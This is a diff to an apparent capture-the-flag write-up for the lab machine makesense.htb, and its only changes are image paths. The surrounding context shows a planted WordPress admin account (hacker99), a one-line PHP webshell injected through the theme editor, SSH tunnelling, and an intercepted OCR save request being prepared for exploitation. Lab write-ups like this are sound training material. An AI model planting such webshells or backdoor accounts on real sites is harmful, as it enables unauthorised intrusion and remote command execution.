@@ -100,7 +100,7 @@ var webagency_ajax = {
 
 ### whisper-wrapper.js — Hardcoded Encryption Key
 
-![Encryption key visible in whisper-wrapper.js](encryption_key.png)
+![Encryption key visible in whisper-wrapper.js](images/encryption_key.png)
 
 ```javascript
 // Symmetric encryption key (must match server-side)
@@ -209,13 +209,13 @@ The admin bot reviews submissions automatically. When it opens our submission, t
 
 ### Login as hacker99
 
-![WordPress admin dashboard accessed as hacker99](admin.png)
+![WordPress admin dashboard accessed as hacker99](images/admin.png)
 
 Navigate to `https://makesense.htb/wp-login.php` and log in as `hacker99 / Hacker123!`.
 
 Users page confirms our new admin account alongside the existing users:
 
-![WordPress users page showing hacker99 as Administrator](users.png)
+![WordPress users page showing hacker99 as Administrator](images/users.png)
 
 ---
 
@@ -229,7 +229,7 @@ Replace the file content with:
 <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
 ```
 
-![PHP webshell injected into index.php via theme editor](reverse_shell.png)
+![PHP webshell injected into index.php via theme editor](images/reverse_shell.png)
 
 Verify RCE:
 
@@ -300,26 +300,26 @@ ssh -L 8001:127.0.0.1:8001 walter@makesense.htb
 
 ### OCR Service Discovery
 
-![MakeSense OCR app — Draw text, Read it back](makesense.png)
+![MakeSense OCR app — Draw text, Read it back](images/makesense.png)
 
 The app lets you draw text on a canvas, OCR it via Tesseract, then save the result to a file.
 
 Basic auth required — walter's credentials work:
 
-![Basic auth sign-in for the OCR service](sign_in.png)
+![Basic auth sign-in for the OCR service](images/sign_in.png)
 
 ### Intercept the Save Request
 
 Using Burp Suite to intercept traffic through the SSH tunnel:
 
-![Burp Suite showing the save POST request with ocr_id parameter](burp_post.png)
+![Burp Suite showing the save POST request with ocr_id parameter](images/burp_post.png)
 
 Save POST parameters:
 ```
 ocr_id=ocr_6a51fd1826b720.36032173&filename=hi.txt&save_output=
 ```
 
-![Drawing recognized as "HI" with save option](draw.png)
+![Drawing recognized as "HI" with save option](images/draw.png)
 
 ### The Vulnerability
 
